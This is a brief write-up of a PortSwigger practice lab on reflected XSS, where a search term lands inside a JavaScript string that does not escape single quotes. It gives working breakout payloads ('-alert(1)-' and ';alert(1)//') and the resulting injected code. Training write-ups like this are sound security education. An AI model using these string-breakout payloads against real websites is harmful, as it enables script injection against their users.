# Lab 07 — Reflected XSS into a JavaScript string with angle brackets HTML encoded

> **Practitioner** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/javascript-string-html-encoded)

**Entry point:** `GET /?search=` — reflected inside a JS string; `<`/`>` are
HTML-encoded, but the single quote is **not** escaped.

## Solution

1. Confirm: `'` survives raw inside the string literal
   `var searchTerms = 'test';`.
2. Close the string and evaluate a subtraction that calls `alert`:

```
'-alert(1)-'
```

Resulting code: `var searchTerms = ''-alert(1)-'';` — the string minus the
return value of `alert()` — the alert fires — lab solved.

## Notes

`';alert(1)//` works identically. The subtraction trick keeps the statement
syntactically valid.
